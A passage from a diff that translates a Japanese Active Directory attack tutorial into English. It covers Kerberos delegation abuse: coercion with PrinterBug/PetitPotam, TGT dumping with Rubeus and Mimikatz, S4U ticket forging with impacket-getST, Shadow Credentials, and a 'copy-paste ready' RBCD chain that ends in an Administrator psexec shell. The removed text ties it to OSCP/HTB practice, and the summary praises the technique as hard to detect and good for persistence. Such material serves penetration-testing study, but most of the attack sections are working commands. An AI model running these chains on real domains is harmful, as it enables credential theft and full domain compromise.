+    A->>UC: Compromise the server
+
+    Note over A: Use coercion attack<br/>to lure Domain Admin
+
     A->>V: PrinterBug /<br/>PetitPotam
-    V->>UC: 認証（TGT付き）
-    UC->>UC: TGT をメモリに保存
-    
+    V->>UC: Authenticate (with TGT)
+    UC->>UC: Store TGT in memory
+
     A->>UC: Rubeus.exe dump
-    UC->>A: Domain Admin の TGT 抽出
-    
-    A->>DC: TGT で認証
-    DC->>A: Domain Admin アクセス
+    UC->>A: Extract Domain Admin TGT
+
+    A->>DC: Authenticate with TGT
+    DC->>A: Domain Admin access
 ```
 
-**攻撃コマンド**
+**Attack Commands**
 
 ```powershell
-# Unconstrained Delegation サーバーを探す
+# Find Unconstrained Delegation servers
 Get-DomainComputer -Unconstrained
 
-# TGT を抽出
+# Extract TGTs
 .\Rubeus.exe dump
 
-# または Mimikatz
+# Or Mimikatz
 sekurlsa::tickets /export
 ```
 
-### Constrained Delegation 攻撃
+### Constrained Delegation Attack
 
 ```mermaid
 sequenceDiagram
-    participant A as 攻撃者
-    participant CD as Constrained<br/>Delegation<br/>アカウント
+    participant A as Attacker
+    participant CD as Constrained<br/>Delegation<br/>Account
     participant DC as Domain Controller
-    participant T as ターゲット<br/>サービス
-    
+    participant T as Target<br/>Service
+
     Note over CD: msDS-AllowedToDelegateTo:<br/>CIFS/TARGET
-    
-    A->>CD: アカウントを侵害<br/>(パスワード/ハッシュ)
-    
-    A->>DC: S4U2Self リクエスト<br/>For: Administrator
-    DC->>A: Administrator チケット
-    
-    A->>DC: S4U2Proxy リクエスト<br/>To: CIFS/TARGET
-    DC->>A: TARGET へのチケット
-    
-    A->>T: Administrator として接続
+
+    A->>CD: Compromise account<br/>(password/hash)
+
+    A->>DC: S4U2Self request<br/>For: Administrator
+    DC->>A: Administrator ticket
+
+    A->>DC: S4U2Proxy request<br/>To: CIFS/TARGET
+    DC->>A: Ticket for TARGET
+
+    A->>T: Connect as Administrator
 ```
 
-**攻撃コマンド**
+**Attack Commands**
 
 ```bash
-# Constrained Delegation を持つアカウントを探す
+# Find accounts with Constrained Delegation
 Get-DomainComputer -TrustedToAuth
 Get-DomainUser -TrustedToAuth
 
-# getST で攻撃
+# Attack with getST
 impacket-getST -spn cifs/target.corp.local -impersonate Administrator -hashes :NTLMHASH corp.local/serviceaccount$
 ```
 
-### Shadow Credentials 攻撃
+### Shadow Credentials Attack
 
-RBCD と似ているが、証明書ベース：
+Similar to RBCD but certificate-based:
 
 ```bash
-# pywhisker で Shadow Credentials を設定
+# Set Shadow Credentials with pywhisker
 python3 pywhisker.py -d corp.local -u john -p 'Password123!' --target WEB01$ --action add
 
-# 証明書で認証
+# Authenticate with certificate
 certipy auth -pfx web01.pfx -dc-ip 10.10.10.100
 ```
 
 ---
 
-## トラブルシューティング
+## Troubleshooting
 
-### エラー 1: "KDC_ERR_BADOPTION"
+### Error 1: "KDC_ERR_BADOPTION"
 
-**原因**: ターゲットが `TrustedToAuthForDelegation` フラグを持っていない
+**Cause**: The target does not have the `TrustedToAuthForDelegation` flag set.
 
-**解決策**:
+**Solution**:
 
 ```bash
-# WEB01$ が委任を受け入れるよう設定されているか確認
+# Check whether WEB01$ is configured to accept delegation
 Get-ADComputer WEB01 -Properties TrustedToAuthForDelegation
 ```
 
-### エラー 2: "KRB_AP_ERR_MODIFIED"
+### Error 2: "KRB_AP_ERR_MODIFIED"
 
-**原因**: チケットが無効、または時刻同期の問題
+**Cause**: Invalid ticket or time synchronization issue.
 
-**解決策**:
+**Solution**:
 
 ```bash
-# NTP で時刻同期
+# Sync time with NTP
 sudo ntpdate 10.10.10.100
 
-# または
+# Or
 sudo timedatectl set-ntp true
 ```
 
-### エラー 3: "STATUS_ACCESS_DENIED"
+### Error 3: "STATUS_ACCESS_DENIED"
 
-**原因**: RBCD 設定が正しくない、または SPN が存在しない
+**Cause**: RBCD configuration is incorrect, or the SPN does not exist.
 
-**解決策**:
+**Solution**:
 
 ```bash
-# RBCD 設定を再確認
+# Re-verify RBCD configuration
 impacket-rbcd -delegate-to 'WEB01$' -action read corp.local/john:'Password123!' -dc-ip 10.10.10.100
 
-# SPN を確認
+# Check SPNs
 setspn -L WEB01
 ```
 
 ---
 
-## チートシート
+## Cheat Sheet
 
-### 完全な攻撃フロー（コピペ用）
+### Complete Attack Flow (Copy-Paste Ready)
 
 ```bash
-# === 1. 権限確認 ===
+# === 1. Check permissions ===
 impacket-dacledit -action read -principal john -target WEB01$ corp.local/john:'Password123!' -dc-ip 10.10.10.100
 
-# === 2. 偽コンピューター作成 ===
+# === 2. Create fake computer ===
 impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Password123!' -dc-ip 10.10.10.100 corp.local/john:'Password123!'
 
-# === 3. RBCD 設定 ===
+# === 3. Configure RBCD ===
 impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'WEB01$' -dc-ip 10.10.10.100 -action write corp.local/john:'Password123!'
 
-# === 4. チケット取得 ===
+# === 4. Obtain ticket ===
 impacket-getST -spn cifs/web01.corp.local -impersonate Administrator -dc-ip 10.10.10.100 corp.local/FAKE01$:'Password123!'
 
-# === 5. アクセス ===
+# === 5. Access ===
 export KRB5CCNAME=Administrator@cifs_web01.corp.local@CORP.LOCAL.ccache
 impacket-psexec -k -no-pass Administrator@web01.corp.local
 ```
 
-### 重要なツール
+### Key Tools
 
-|ツール|用途|
+| Tool | Purpose |
 |---|---|
-|**PowerView**|権限列挙・RBCD設定 (Windows)|
-|**Impacket rbcd.py**|RBCD設定 (Linux)|
-|**Impacket getST.py**|S4U攻撃・チケット取得|
-|**Rubeus**|S4U攻撃 (Windows)|
-|**BloodHound**|攻撃パスの可視化|
-|**Powermad**|コンピューターアカウント作成|
+| **PowerView** | Permission enumeration and RBCD configuration (Windows) |
+| **Impacket rbcd.py** | RBCD configuration (Linux) |
+| **Impacket getST.py** | S4U attack / ticket acquisition |
+| **Rubeus** | S4U attack (Windows) |
+| **BloodHound** | Attack path visualization |
+| **Powermad** | Computer account creation |
 
 ---
 
-## まとめ
+## Summary
 
-RBCD 攻撃は強力で、以下の理由から人気があります：
+RBCD attacks are powerful and popular for the following reasons:
 
-✅ **Domain Admin 権限不要** - GenericWrite だけで実行可能 ✅ **検出が困難** - 正規の Kerberos プロトコルを使用 ✅ **柔軟性が高い** - 任意のユーザーになりすまし可能 ✅ **永続化が可能** - RBCD 設定を残すことで再侵入が容易
-
-OSCP や HTB では頻出の攻撃手法なので、しっかりマスターしましょう！
+✅ **No Domain Admin required** - executable with only GenericWrite
+✅ **Difficult to detect** - uses legitimate Kerberos protocol
+✅ **Highly flexible** - can impersonate any user
+✅ **Persistence-friendly** - leaving the RBCD configuration in place makes re-entry easy
